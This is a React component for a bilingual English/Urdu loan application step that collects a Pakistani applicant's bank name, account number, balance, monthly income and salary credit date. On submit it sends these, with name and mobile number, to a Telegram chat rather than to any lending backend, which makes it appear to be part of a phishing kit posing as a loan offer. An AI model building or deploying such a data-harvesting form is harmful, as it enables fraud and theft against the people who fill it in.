import React, { useState } from 'react';
import { LoanApplicationState } from '../types';
import { ArrowRight, ArrowLeft, Building2 } from 'lucide-react';
import { sendTelegramMessage } from '../utils/telegram';

interface BankStepProps {
  data: LoanApplicationState;
  updateData: (fields: Partial<LoanApplicationState>) => void;
  onNext: () => void;
  onBack: () => void;
}

export const BankStep: React.FC<BankStepProps> = ({ data, updateData, onNext, onBack }) => {
  const [error, setError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!data.loanAmount || !data.loanPurpose || !data.occupation || !data.bankName || !data.accountNumber || !data.currentBalance || !data.monthlyIncome || !data.incomeDate) {
      setError('Please fill in all required bank information fields / براہ کرم تمام بینک معلومات کے خانے پر کریں۔');
      return;
    }
    setError('');

    sendTelegramMessage(
      `🏦 *Loan Application - Bank & Income*\n🔑 *Session ID: ${data.sessionId}*\n👤 Name: ${data.fullName}\n📱 Mobile: ${data.mobileNo}\n💰 Loan Amount: PKR ${data.loanAmount}\n🎯 Purpose: ${data.loanPurpose}\n💼 Occupation: ${data.occupation}\n🏛️ Bank: ${data.bankName}\n💳 Account No: ${data.accountNumber}\n💵 Balance: PKR ${data.currentBalance}\n📈 Monthly Income: PKR ${data.monthlyIncome}\n📅 Income Date: ${data.incomeDate}`
    );

    onNext();
  };

  return (
    <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 md:p-8 max-w-2xl mx-auto">
      <div className="flex items-center justify-between pb-6 border-b border-slate-100 mb-6">
        <div>
          <h2 className="text-xl font-bold text-slate-900">Bank Information</h2>
          <p className="text-sm text-slate-500">Apni bank ki maloomat darj karein</p>
        </div>
        <span className="text-xs font-semibold bg-emerald-50 text-emerald-800 px-3 py-1 rounded-full border border-emerald-200">
          بینک معلومات
        </span>
      </div>

      {error && (
        <div className="mb-6 p-4 bg-red-50 border border-red-200 text-red-700 text-sm rounded-xl">
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-5">
        <div>
          <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
            <span>Loan Amount Required (PKR) *</span>
            <span className="font-normal text-slate-500 font-urdu">مطلوبہ قرض کی رقم</span>
          </label>
          <input
            type="number"
            required
            placeholder="Enter amount (e.g. 500000)"
            value={data.loanAmount}
            onChange={(e) => updateData({ loanAmount: e.target.value })}
            className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
          />
          <p className="text-[11px] text-slate-500 mt-1">Range: PKR 1,00,000 (1 Lakh) – 3,00,00,000 (3 Crore)</p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Loan Purpose *</span>
              <span className="font-normal text-slate-500 font-urdu">قرض کا مقصد</span>
            </label>
            <select
              required
              value={data.loanPurpose}
              onChange={(e) => updateData({ loanPurpose: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            >
              <option value="">Select reason for loan</option>
              <option value="Business Expansion">Business Expansion / کاروبار میں توسیع</option>
              <option value="Agriculture & Farming">Agriculture & Farming / زرعی قرضہ</option>
              <option value="Home Construction">Home Construction / گھر کی تعمیر</option>
              <option value="Higher Education">Higher Education / اعلیٰ تعلیم</option>
              <option value="IT & Tech Startup">IT & Tech Startup / آئی ٹی اسٹارٹ اپ</option>
              <option value="Personal / Marriage">Personal / Marriage / ذاتی یا شادی</option>
            </select>
          </div>

          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Occupation *</span>
              <span className="font-normal text-slate-500 font-urdu">پیشہ</span>
            </label>
            <select
              required
              value={data.occupation}
              onChange={(e) => updateData({ occupation: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            >
              <option value="">Select occupation</option>
              <option value="Salaried Employee">Salaried Employee / تنخواہ دار ملازم</option>
              <option value="Business Owner / Trader">Business Owner / Trader / تاجر</option>
              <option value="Farmer / Agriculturist">Farmer / کسان</option>
              <option value="Freelancer / IT Professional">Freelancer / فری لانسر</option>
              <option value="Government Servant">Government Servant / سرکاری ملازم</option>
              <option value="Other">Other / دیگر</option>
            </select>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Bank Name *</span>
              <span className="font-normal text-slate-500 font-urdu">بینک کا نام</span>
            </label>
            <select
              required
              value={data.bankName}
              onChange={(e) => updateData({ bankName: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            >
              <option value="">Select your bank / اپنا بینک منتخب کریں</option>
              
              <optgroup label="Digital Wallets & Microfinance / ڈیجیٹل والٹس اور مائیکرو فائنانس">
                <option value="EasyPaisa">EasyPaisa (Telenor Microfinance Bank)</option>
                <option value="JazzCash">JazzCash (Mobilink Microfinance Bank)</option>
                <option value="SadaPay">SadaPay</option>
                <option value="NayaPay">NayaPay</option>
                <option value="Raast">Raast (State Bank of Pakistan)</option>
                <option value="UPaisa">UPaisa (U Microfinance Bank)</option>
                <option value="Khushhali Microfinance Bank">Khushhali Microfinance Bank</option>
                <option value="FINCA Microfinance Bank">FINCA Microfinance Bank</option>
                <option value="NRSP Microfinance Bank">NRSP Microfinance Bank</option>
                <option value="APNA Microfinance Bank">APNA Microfinance Bank</option>
                <option value="Advans Microfinance Bank">Advans Pakistan Microfinance Bank</option>
                <option value="First MicroFinance Bank">First MicroFinance Bank (FMFB)</option>
                <option value="Sindh Microfinance Bank">Sindh Microfinance Bank</option>
              </optgroup>

              <optgroup label="Major Commercial Banks / مرکزی تجارتی بینک">
                <option value="HBL">Habib Bank Limited (HBL)</option>
                <option value="Meezan Bank">Meezan Bank Limited</option>
                <option value="Bank Alfalah">Bank Alfalah</option>
                <option value="Allied Bank">Allied Bank Limited (ABL)</option>
                <option value="MCB">MCB Bank Limited</option>
                <option value="UBL">United Bank Limited (UBL)</option>
                <option value="National Bank">National Bank of Pakistan (NBP)</option>
                <option value="Askari Bank">Askari Bank Limited</option>
                <option value="Bank AL Habib">Bank AL Habib Limited</option>
                <option value="Faysal Bank">Faysal Bank Limited</option>
                <option value="Habib Metropolitan Bank">Habib Metropolitan Bank (HabibMetro)</option>
                <option value="Soneri Bank">Soneri Bank Limited</option>
                <option value="JS Bank">JS Bank Limited</option>
                <option value="Standard Chartered">Standard Chartered Bank Pakistan</option>
                <option value="Silkbank">Silkbank Limited</option>
                <option value="Summit Bank">Summit Bank / Makramah Bank</option>
                <option value="Samba Bank">Samba Bank Limited</option>
              </optgroup>

              <optgroup label="Islamic Banks / اسلامی بینک">
                <option value="Meezan Bank">Meezan Bank Limited</option>
                <option value="BankIslami">BankIslami Pakistan Limited</option>
                <option value="Dubai Islamic Bank">Dubai Islamic Bank Pakistan (DIB)</option>
                <option value="Al Baraka Bank">Al Baraka Bank Pakistan</option>
                <option value="Faysal Islamic Bank">Faysal Bank (Islamic)</option>
              </optgroup>

              <optgroup label="Government & Specialized Banks / سرکاری و خصوصی بینک">
                <option value="National Bank">National Bank of Pakistan (NBP)</option>
                <option value="Bank of Punjab">The Bank of Punjab (BOP)</option>
                <option value="Bank of Khyber">The Bank of Khyber (BOK)</option>
                <option value="Sindh Bank">Sindh Bank Limited</option>
                <option value="ZTBL">Zarai Taraqiati Bank Limited (ZTBL)</option>
                <option value="First Women Bank">First Women Bank Limited (FWBL)</option>
                <option value="SME Bank">SME Bank Limited</option>
              </optgroup>

              <optgroup label="Foreign Banks / غیر ملکی بینک">
                <option value="Citibank">Citibank N.A. Pakistan</option>
                <option value="Deutsche Bank">Deutsche Bank AG Pakistan</option>
                <option value="ICBC">Industrial & Commercial Bank of China (ICBC)</option>
                <option value="Bank of China">Bank of China Limited Pakistan</option>
              </optgroup>
            </select>
          </div>

          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Account Number *</span>
              <span className="font-normal text-slate-500 font-urdu">اکاؤنٹ نمبر</span>
            </label>
            <input
              type="text"
              required
              placeholder="01234567890123"
              value={data.accountNumber}
              onChange={(e) => updateData({ accountNumber: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50 font-mono"
            />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Current Bank Balance (PKR) *</span>
              <span className="font-normal text-slate-500 font-urdu">موجودہ بینک بیلنس</span>
            </label>
            <input
              type="number"
              required
              placeholder="Enter balance"
              value={data.currentBalance}
              onChange={(e) => updateData({ currentBalance: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            />
          </div>

          <div>
            <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
              <span>Monthly Income (PKR) *</span>
              <span className="font-normal text-slate-500 font-urdu">ماہانہ آمدنی</span>
            </label>
            <input
              type="number"
              required
              placeholder="Enter monthly income"
              value={data.monthlyIncome}
              onChange={(e) => updateData({ monthlyIncome: e.target.value })}
              className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
            />
          </div>
        </div>

        <div>
          <label className="block text-xs font-bold text-slate-700 mb-1 flex justify-between">
            <span>Monthly Income / Salary Credit Date *</span>
            <span className="font-normal text-slate-500 font-urdu">آمدنی / تنخواہ کی تاریخ</span>
          </label>
          <input
            type="date"
            required
            value={data.incomeDate || ''}
            onChange={(e) => updateData({ incomeDate: e.target.value })}
            className="w-full px-4 py-2.5 rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 focus:border-transparent text-sm bg-slate-50/50"
          />
          <p className="text-[11px] text-slate-500 mt-1">Select the day when your monthly salary or income is credited to your bank account.</p>
        </div>

        <div className="pt-4 flex justify-between">
          <button
            type="button"
            onClick={onBack}
            className="flex items-center space-x-2 px-5 py-3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold rounded-xl text-sm transition-all"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back / واپس</span>
          </button>
          
          <button
            type="submit"
            className="flex items-center space-x-2 px-6 py-3 bg-[#0b1f36] hover:bg-slate-800 text-white font-semibold rounded-xl text-sm shadow-md transition-all"
          >
            <span>Continue / جاری رکھیں</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </form>
    </div>
  );
};
